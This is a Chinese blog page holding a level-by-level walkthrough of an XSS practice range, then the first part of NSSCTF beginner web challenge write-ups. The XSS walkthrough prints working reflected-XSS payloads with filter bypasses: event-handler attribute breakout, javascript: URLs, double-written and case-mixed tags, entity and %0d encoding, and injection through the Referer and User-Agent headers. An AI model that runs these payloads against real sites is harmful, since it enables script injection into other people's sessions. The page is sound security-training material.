        <h1 id="level-1"   >
          <a href="#level-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241452155.png" alt="image-20230924145239094"></p>
<p>URL有输入，我们更改一下name</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xssaq.com/yx/level1.php?name=admin</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241453580.png" alt="image-20230924145323522"></p>
<p>发现界面有变化</p>
<p>尝试构造脚本，将</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>传入name变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241454337.png" alt="image-20230924145448291"></p>

        <h1 id="level-2"   >
          <a href="#level-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241456802.png" alt="image-20230924145634756"></p>
<p>将</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>传入keyword变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241457807.png" alt="image-20230924145703759"></p>
<p>界面有变化，但是没成功，查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241458877.png"></p>
<p>可以看到&lt;&gt;更改了，但是插入到value参数中的代码并没有更改而是直接返回</p>
<p>上网搜索后发现是“看到</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>被嵌套到value属性中，所以我们需要闭合input标签。”</p>

        <h6 id="用例子解释一下这个闭合"   >
          <a href="#用例子解释一下这个闭合" class="heading-link"><i class="fas fa-link"></i></a><a href="#用例子解释一下这个闭合" class="headerlink" title="用例子解释一下这个闭合"></a>用例子解释一下这个闭合</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241720254.png" alt="image-20230924172010225"></p>
<p>所以构建payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241711195.png" alt="image-20230924171159157"></p>

        <h1 id="level-3"   >
          <a href="#level-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241725069.png" alt="image-20230924172506020"></p>
<p>试着在框里输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241725435.png" alt="image-20230924172553382"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309241728449.png" alt="image-20230924172816412"></p>
<p>发现value中原本输入的字符&lt;&gt;变化了，那就说明value属性过滤了</p>
<p>构造一个事件，使得事件发生时，则执行JavaScript</p>
<p>在框内输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></div></figure>

<p>成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141552287.png" alt="image-20231014155217175"></p>

        <h1 id="level-4"   >
          <a href="#level-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141554297.png" alt="image-20231014155402215"></p>
<p>将</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>传入keyword变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141554749.png" alt="image-20231014155432655"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141555553.png" alt="image-20231014155525491"></p>
<p>发现&lt;&gt;都被过滤掉了，也可以构造一个事件进行绕过，用双引号进行属性闭合</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p>再点击输入框则成功通关</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141652076.png" alt="image-20231014165220004"></p>

        <h1 id="level-5"   >
          <a href="#level-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141652923.png" alt="image-20231014165239818"></p>
<p>老样子，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141657152.png" alt="image-20231014165700072"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141657381.png" alt="image-20231014165740322"></p>
<p>发现中间多了“_”，用点击事件试一下，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141658993.png" alt="image-20231014165842861"></p>
<p>o和n中间还是多了”_”，可能是对on进行了过滤</p>
<p>尝试混合大小写字符，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ Onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141702762.png" alt="image-20231014170230684"></p>
<p>还是不行，只能换一个标签来执行代码，仍然要闭合<input>标签，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141730010.png" alt="image-20231014173027877"></p>
<p>点击输入框右边的”&gt;，即可通关成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141731029.png" alt="image-20231014173100915"></p>

        <h1 id="level-6"   >
          <a href="#level-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141731309.png" alt="image-20231014173158226"></p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141732436.png" alt="image-20231014173253381"></p>
<p>还是过滤，尝试大小写混写过滤，同时双引号闭合，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>成功通关</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141734229.png" alt="image-20231014173453147"></p>

        <h1 id="level-7"   >
          <a href="#level-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141735345.png" alt="image-20231014173528269"></p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>后查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141736093.png" alt="image-20231014173603047"></p>
<p>发现script直接被过滤掉了，再尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310141737497.png" alt="image-20231014173731453"></p>
<p>onclick也被过滤掉，接着尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151007084.png" alt="image-20231015100745979"></p>
<p>herf也被过滤了</p>
<p>按上一关的方法尝试大小写绕过</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151013481.png" alt="image-20231015101307443"></p>
<p>还是不行，再试试双写绕过</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(/xss/)&lt;/scriscriptpt&gt;</span><br></pre></td></tr></table></div></figure>

<p>成功通关</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151016608.png" alt="image-20231015101626568"></p>

        <h1 id="level-8"   >
          <a href="#level-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151016994.png" alt="image-20231015101640948"></p>
<p>注入<script>alert(/xss/)</script></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151019487.png" alt="image-20231015101941450"></p>
<p>value中的&lt;&gt;被转义，并且输入的内容插入了a标签的href中，其中的script也被转义成scr_ipt，所以不能使用带&lt;&gt;的内容，而且不是被过滤成空字符，也就不能使用双写绕过</p>
<p>尝试事件绕过，传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“ onclick=”alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151031248.png" alt="image-20231015103128218"></p>
<p>”也被转转义，href中的onclick也被转义成o_nclick</p>
<p>我们在输入框输入的内容，会被带入到友情链接href属性中，试一下javascript伪协议，尝试传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151103100.png" alt="image-20231015110343069"></p>
<p>javascript被转义成javascr_ipt，只能试试编码绕过了，进行HTML实体编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310151121906.png" alt="image-20231015112111841"></p>
<p>在框内输入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310171536689.png" alt="image-20231017153651540"></p>
<p>再点击友情链接，成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310171537796.png" alt="image-20231017153757748"></p>

        <h1 id="level-9"   >
          <a href="#level-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h1>
      <p><img src="../AppData/Roaming/Typora/typora-user-images/image-20231017154620127.png" alt="image-20231017154620127"></p>
<p>正常注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310171603427.png" alt="image-20231017160307394"></p>
<p>和上题一样的有转义，有链接，但这个显示链接不合法，查看后台源码看看怎么回事</p>
<p>（一般像这种有靶场的，可以在google上搜索该网站，到github上获得开源的）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181439814.png" alt="image-20231018143942700"></p>

        <h6 id="strpos-函数返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回-false。"   >
          <a href="#strpos-函数返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回-false。" class="heading-link"><i class="fas fa-link"></i></a><a href="#strpos-函数返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回-false。" class="headerlink" title="strpos() 函数返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回 false。"></a>strpos() <em>函数</em>返回字符串在另一个字符串中第一次出现的位置。如果没有找到该字符串，则返回 false。</h6>
      <p>就是说输入的字符串内必须要有http://字符，于是尝试注入</p>
<p> (javascript伪协议还是用html实体编码)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181450629.png" alt="image-20231018145039598"></p>
<p>看得出来链接已经合法了但是但是http://在前面是无法执行JavaScript，给它放到最后面并且用//注释掉，在输入框内输入</p>
<p>成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181456295.png" alt="image-20231018145610261"></p>

        <h1 id="level-10"   >
          <a href="#level-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181456893.png" alt="image-20231018145640803"></p>
<p>正常注入<script>alert(/xss/)</script></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181459235.png" alt="image-20231018145910204"></p>
<p>发现&lt;&gt;被转义，除了keyword外还有三个参数，尝试给三个参数传参</p>
<p><code>https://xssaq.com/yx/level10.php?keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181501319.png" alt="image-20231018150128286"></p>
<p>发现只有t_sort接受了传参，要使用t_sort就得变换本身的hidden类型，把它改成其他类型button，注意双引号闭合</p>
<p>在URL上给keyword和t_sort传参</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot;%20onclick=&quot;alert(1)</span><br></pre></td></tr></table></div></figure>

<p>再按F12把t_sort本身的hidden类型改成button</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181509704.png" alt="image-20231018150942673"></p>
<p>回车后画面中会出现一个按钮</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181510378.png" alt="image-20231018151029344"></p>
<p>点击按钮，成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181512502.png" alt="image-20231018151257400"></p>

        <h1 id="level-11"   >
          <a href="#level-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181513216.png" alt="image-20231018151310174"></p>
<p>看起来和上一关差不多，直接查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181521543.png" alt="image-20231018152114489"></p>
<p> t_ref 已经有了值，而且是上一关通关的payload</p>
<p>正常传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181513433.png" alt="image-20231018151353399"></p>
<p>依然有&lt;&gt;的转义，但t_ref的值没了，类似的方法给另外四个参数也传参</p>
<p><code>?keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4&amp;t_ref=5</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181525332.png" alt="image-20231018152545257"></p>
<p>还是t_sort接受传参，但是t_ref没了，再用上一关的方法试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181536992.png" alt="image-20231018153640925"></p>
<p>双引号也被转义了，抓包看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181543511.png" alt="image-20231018154339455"></p>
<p> 可以看出ref 是 http 头中的 referer 属性，修改一下Referer的值为5</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181544146.png"></p>
<p>成功传入</p>
<p>从这里入手构造payload</p>
<p>可以在burpsuit里修改Referer的值，也可以直接在网页按F12里修改t_ref，同时把该参数的类型更改为button类型</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181555383.png" alt="image-20231018155532291"></p>
<p>按一下按钮成功通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181555057.png" alt="image-20231018155557988"></p>

        <h1 id="level-12"   >
          <a href="#level-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181557557.png" alt="image-20231018155728451"></p>
<p>直接查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181557368.png" alt="image-20231018155743325"></p>
<p>显然和上一关类似，只是t_ref换成了t_ua</p>
<p>直接F12修改t_ua的值，并且改变成button类型</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181559365.png" alt="image-20231018155914274"></p>
<p>点击按钮即可通关！</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181559187.png" alt="image-20231018155941032"></p>

        <h1 id="level-13"   >
          <a href="#level-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181601034.png" alt="image-20231018160150945"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181602428.png" alt="image-20231018160205370"></p>
<p>和前两关相同</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181604942.png" alt="image-20231018160421801"></p>

        <h1 id="level-16"   >
          <a href="#level-16" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181616731.png" alt="image-20231018161635493"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181617771.png" alt="image-20231018161705723"></p>
<p>和之前的不太一样，正常注入试试<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181705516.png" alt="image-20231018170503472"></p>
<p> script和/没了，试一下没有这两个的</p>
<p>传入“ onclick=”alert(1)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181706816.png" alt="image-20231018170645786"></p>
<p>空格也没了</p>
<p>用回车代替空格绕过试试（回车、换行不支持在on事件中使用）</p>
<p>可以用：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src =x onerror=alert(111)&gt;</span><br></pre></td></tr></table></div></figure>

<p>要使用URL编码将回车符转换为%0d</p>
<p>所以传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0dsrc=x%0donerror=alert(111)&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310181713997.png" alt="image-20231018171337868"></p>

        <h1 id="level-17"   >
          <a href="#level-17" class="heading-link"><i class="fas fa-link"></i></a><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310182107428.png" alt="image-20231018210758371"></p>
<p>（要使用flash才能显示出图片，不过也影响不大）</p>
<p>从url可以看出是要对arg01和arg02传参</p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310190912392.png" alt="image-20231019091245312"></p>
<p>修改一下arg01和arg02的值</p>
<p><code>?arg01=1&amp;arg02=2</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310190913772.png" alt="image-20231019091330739"></p>
<p>发现src的值发生了变化</p>
<p>这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick看作另外一个属性。从而执行javascript语句。</p>
<p>执行</p>
<p><code>?arg01=a&amp;arg02=b%20onmouseover=alert(1)</code></p>
<p>(onclick不行，应该是因为加载不出图片无法点击，所以用不了这个事件)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202310190923882.png" alt="image-20231019092332845"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/06/NSSCTF%20WEB/">NSSCTF WEB</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-29</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、-SWPUCTF-2021-新生赛-jicao"   >
          <a href="#一、-SWPUCTF-2021-新生赛-jicao" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-SWPUCTF-2021-新生赛-jicao" class="headerlink" title="一、[SWPUCTF 2021 新生赛]jicao"></a>一、[SWPUCTF 2021 新生赛]jicao</h1>
      <p>打开后出现这样一堆代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071607884.png" alt="image-20230107160708841"></p>
<p>经阅读可知，要想获取flag，需要POST一个值为wllmNB的参数id和GET一个值为{“x“：”wllm“}的参数json（json值的来源：[x]相当于数组的下标，冒号相当于解释说明该数组下标，然后查资料得json的格式为<code>$json = &#39;&#123;&quot;a&quot;:&quot;php&quot;,&quot;b&quot;:&quot;mysql&quot;,&quot;c&quot;:3&#125;&#39;</code>）</p>

        <h3 id="法Ⅰ：HackBar"   >
          <a href="#法Ⅰ：HackBar" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：HackBar" class="headerlink" title="法Ⅰ：HackBar"></a>法Ⅰ：HackBar</h3>
      <p>由于GET函数在URL体现，即从URL传进来的是GET函数</p>
<p>所以URL  <code>http://1.14.71.254:28387/?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</code></p>
<p>选择”Use POST method”</p>
<p>“Body”处则填写需要POST的内容</p>
<p>即如图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071630815.png" alt="image-20230107163022749"></p>
<p>EXECUTE后网页便出现了flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071630308.png" alt="image-20230107163052248"></p>

        <h3 id="法Ⅱ：Burpsuite"   >
          <a href="#法Ⅱ：Burpsuite" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：Burpsuite" class="headerlink" title="法Ⅱ：Burpsuite"></a>法Ⅱ：Burpsuite</h3>
      <p>发送到”repeater”后</p>
<p>GET需要改成POST</p>
<p>（PS：这代表只会用POST请求，后面的东西与它无关）</p>
<p>然后在空白处添上POST的值 id=wllmNB</p>
<p>如图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071657640.png" alt="image-20230107165713584"></p>
<p>GO之后得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081023505.png" alt="image-20230108102344407"></p>

        <h1 id="二、-SWPUCTF-2021-新生赛-Do-you-know-http"   >
          <a href="#二、-SWPUCTF-2021-新生赛-Do-you-know-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、-SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="二、[SWPUCTF 2021 新生赛]Do_you_know_http"></a>二、[SWPUCTF 2021 新生赛]Do_you_know_http</h1>
      <p>点开环境</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301071718113.png" alt="image-20230107171822067"></p>
<p>告诉我们需要用WLLM浏览器，那就用HackBar添加头</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081027391.png" alt="image-20230108102732269"></p>
<p>EXECUTE后，它又要求我们使用本地地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081028420.png" alt="image-20230108102819362"></p>
<p>继续添加头，并注意此时URL已经发生变化，在使用HackBar时应注意修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081029323.png" alt="image-20230108102957268"></p>
<p>EXECUTE后，就得到了flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081030153.png" alt="image-20230108103026112"></p>
<p>该题类似于 [极客大挑战 2019]Http 1</p>

        <h6 id="附上常见请求报文的代表含义"   >
          <a href="#附上常见请求报文的代表含义" class="heading-link"><i class="fas fa-link"></i></a><a href="#附上常见请求报文的代表含义" class="headerlink" title="附上常见请求报文的代表含义"></a>附上常见请求报文的代表含义</h6>
      <p><em>User-Agent：产生请求的浏览器类型，一般可以随意指定，但是当服务器方面有限制则会受到影响，比如爬虫进行检查</em><br><em>Accept：用户声明客户端可以处理的MIME类型，即文件类型</em><br><em>Accept-Encoding：用于声明客户端能够理解的内容编码方式</em><br><em>Accept-Language：用于声明客户端可以理解的自然语言</em><br><em>Cookie：存放用户的身份凭证</em><br><em>Content-Length：请求数据的长度，服务器端只会按照该字段进行长度解析，多余的截断。</em><br><em>Referer：当前访问URL的上一个URL，用户从什么地方来到该页面的</em></p>

        <h1 id="三、-SWPUCTF-2021-新生赛-gift-F12"   >
          <a href="#三、-SWPUCTF-2021-新生赛-gift-F12" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="三、[SWPUCTF 2021 新生赛]gift_F12"></a>三、[SWPUCTF 2021 新生赛]gift_F12</h1>
      <p>打开后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081048166.png" alt="image-20230108104838977"></p>
<p>直接查看网页源代码，并搜索flag，即可得到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301081050326.png" alt="image-20230108105014274"></p>

        <h1 id="四、-第五空间-2021-WebFTP"   >
          <a href="#四、-第五空间-2021-WebFTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-第五空间-2021-WebFTP" class="headerlink" title="四、[第五空间 2021]WebFTP"></a>四、[第五空间 2021]WebFTP</h1>
      <p>打开环境后是一个登录界面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131504554.png" alt="image-20230113150457454"></p>
<p>首先考虑是否是sql注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131505442.png" alt="image-20230113150527358"></p>
<p>看来不是，再尝试抓包，也毫无所获，只能确确实实找出这个用户名和密码</p>
<p>后来得知像这种年份很老的框架，一般会放在github上有开源框架的，于是在github上搜索webftp</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202301131548149.png" alt="image-20230113154841074"></p>
<p>找到里面有一个README，点开后在最后便有初始账号</p>
